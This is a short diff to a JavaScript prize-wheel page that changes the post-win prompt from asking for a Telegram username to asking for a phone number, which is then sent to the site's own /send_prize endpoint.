@@ -67,7 +67,7 @@ document.addEventListener("DOMContentLoaded", () => {
       showWinPopup(winningPrize.text);
 
       setTimeout(async () => {
-        const username = prompt("Введите ваш Telegram username без @:");
+        const username = prompt("Чтобы получить приз, введите ваш номер телефона:");
         if (username) {
           try {
             await fetch("/send_prize", {
@@ -85,3 +85,4 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 6000);
   });
 });
+
